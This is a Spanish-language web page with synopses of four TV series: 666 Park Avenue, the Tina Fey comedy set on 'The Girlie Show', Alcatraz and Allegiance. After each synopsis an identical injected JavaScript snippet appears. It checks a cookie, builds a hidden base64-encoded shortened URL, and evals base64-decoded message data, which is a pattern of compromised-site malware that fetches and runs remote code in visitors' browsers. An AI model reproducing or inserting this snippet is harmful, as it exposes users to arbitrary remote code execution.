Descripcion
¿Qué estarías dispuesto a hacer para conseguir todo lo que deseas? Estás invitado a entrar en 666 Park Avenue, una de las direcciones más seductoras de la ciudad de Nueva York. Todo el mundo tiene necesidades acuciantes, deseos y ambiciones. Para los residentes de The Drake, uno de los edificios de apartamentos más lujosos del Upper East Side de Manhattan, todo ello está al alcance de sus manos, por un módico precio, gracias a la cortesía del misterioso dueño de inmueble. Sexy, seductor y acogedor, The Drake mantiene un oscuro control sobre sus inquilinos, alimentando sus ambiciones y deseos. Pero cuidado con lo que deseas, porque el precio que tendrán que pagar por ello es… tu alma.
Bienvenido a The Drake, un aparentemente normal edificio de apartamentos, en donde el mal, la obsesión y los sucesos paranormales están incluidos en el alquiler. En él, todo lo que deseas puede ser tuyo, cortesía de su misterioso propietario, Gavin Doran (Terry O'Quinn, Perdidos). Pero todo contrato de este tipo tiene un precio. Y eso es lo que están a punto de averiguar Jane Van Veen (Rachael Taylor, Los ángeles de Charlie) y Henry Martin (Dave Annable, Cinco hermanos), una joven e idealista pareja que acaba de llegar a la glamurosa Nueva York, en donde se les ofrece la oportunidad de ser los administradores del histórico inmueble. Jane es una chica de pueblo con grandes ambiciones, siempre quiso ser arquitecta. Henry, miembro del equipo del alcalde, es sensato, inteligente y tenaz. Ambos se han visto arrastrados por el intoxicante estilo de vida de la élite de la ciudad.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

Descripcion
Bienvenidos al set de rodaje de "The Girlie Show", un programa de televisión de variedades en directo, que sirve como escenario para Rockefeller Plaza, una comedia sobre los entresijos en la producción y creación de un espacio de estas características. La serie está narrada a través del personaje de Liz Lemon (Tina Fey, Saturday Night Live), la guionista principal del programa y que frecuentemente suele ser llevada al límite de su razón y paciencia por las dos estrellas del programa, y el exigente director de la cadena.
Liz, que sigue soltera debido a su compromiso con su trabajo, está viviendo el sueño de todo guionista de comedia, ser la principal responsable creativa de un exigente programa en directo en la ciudad de Nueva York. Aunque su vida tendrá un inesperado sobresalto cuando Jack Donaghy (Alec Baldwin, El Aviador) el descarado nuevo ejecutivo de la cadena decide interferir en el programa y ponerlo patas arriba con sus métodos intrusivos. Además, este ejecutivo decide intimidar a Liz para darle más protagonismo a Tracy Jordan (Tracy Morgan, Saturday Night Live), un egocéntrico e imprevisible actor de cine, que acaba de incorporarse al elenco artístico del programa. Ahora Liz deberá controlar y manejar lo incontrolable, para que el programa, y su sueño, pueda salir adelante.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

Descripcion
De los productores ejecutivos J.J. Abrams (Fringe) y Elizabeth Sarnoff (Perdidos) llega Alcatraz, una serie de suspense centrada en la más infame prisión de América, que en el pasado, fue el hogar de los asesinos, violadores, secuestradores y ladrones más peligrosos del país. En ella, una detective de San Francisco es asignada a investigar un asesinato y descubre que el principal sospechoso del caso es un antiguo preso de Alcatraz que ha estado muerto desde hace décadas. Y es que poco a poco saldrá a la luz que un grupo de prisioneros y guardias de esta conocida prisión que desaparecieron de forma misteriosa hace treinta años, están empezando a reaparecer en el presente.
Cuando la detective Rebecca Madsen (Sarah Jones, Sons of Anarchy), de la Policía de San Francisco, es asignada a un complicado caso de homicidio, una huella le lleva a un sorprendente sospechoso, un ex-preso de Alcatraz que murió hace décadas. Debido a su historia familiar, su abuelo y su tío, Ray Archer (Robert Forster, Jackie Brown), fueron guardias de esa prisión, Rebecca muestra un gran interés en el caso, y una vez que descubre que el enigmático y silencioso Emerson Hauser (Sam Neill, Los Tudor), un agente del Gobierno, trata de impedir su investigación, su compromiso con el caso se hace incluso mucho más grande. (function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

Descripcion
'Allegiance' se centra en la figura de Alex O'Connor (Gavin Stenhouse), un joven idealista y agente de la CIA especializado en matería rusa. Aunque su vida parece seguir su cauce habitual, todo cambiará cuando conozca un secreto que cambiará la idealizada imagen que tenía de su familia. Sus padres, Mark (Scott Cohen) y Katya (Hope Davis), son espías rusos encubiertos en EE.UU que fueron desactivados hace décadas. No obstante, una operación terrorista contra los Estados Unidos los devolverá de nuevo a sus puestos y a la realidad.
Años atrás, Katya, de origen ruso, tuvo que reclutar a un empresario estadounidense llamado Mark O'Connor por orden de la KGB. El amor surgió rápidamente y estos les llevo a trazar un acuerdo: mientras Katya siga siendo una ventaja para Rusia en un futuro, se les permitiría a ambos mudarse a EE.UU y casarse. Esto dio lugar a una próspera vida que hizo que se olvidaran completamente de su verdadero propósito. Los últimos acontecimientos les pondrá en una difícil situación por la que tendrán que tomar una clara decisión: traicionar a su país o traicionar a su familia.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

